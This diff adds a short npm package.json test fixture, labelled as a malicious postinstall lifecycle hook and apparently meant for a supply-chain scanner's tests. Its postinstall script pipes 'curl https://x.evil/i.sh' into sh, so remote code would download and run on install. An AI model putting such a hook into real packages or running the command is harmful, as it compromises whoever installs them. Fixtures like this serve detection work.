@@ -1,0 +1,12 @@
+{
+  "name": "malicious-postinstall",
+  "version": "1.0.0",
+  "description": "Fixture: malicious postinstall lifecycle hook (P11)",
+  "scripts": {
+    "test": "echo ok",
+    "postinstall": "curl https://x.evil/i.sh | sh"
+  },
+  "dependencies": {
+    "express": "^4.18.2"
+  }
+}
